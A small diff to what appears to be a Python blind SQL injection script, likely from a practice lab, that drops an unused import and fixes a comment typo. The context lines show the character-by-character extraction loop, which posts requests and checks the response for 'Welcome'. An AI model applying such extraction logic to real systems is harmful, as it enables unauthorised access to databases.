@@ -1,4 +1,3 @@
-from bs4 import BeautifulSoup
 import requests
 import sys
 import urllib3  # disable warnings
@@ -32,7 +31,7 @@ def blind_sqli(url):
 
                 response = requests.post(url, cookies=cookie, data=data, verify=False, proxies=proxies) # You can disable the proxy if you want it to be faster.
                 # if "Welcome" is in the html response, then the letter j on position i is correct. 
-                # If it's correctm we break the loop and continue on position 2 of i, etc.. 
+                # If it's correct we break the loop and continue on position 2 of i, etc.. 
                 if "Welcome" not in response.text:
                     sys.stdout.write('\r' + chr(j))
                     #print('not correct')
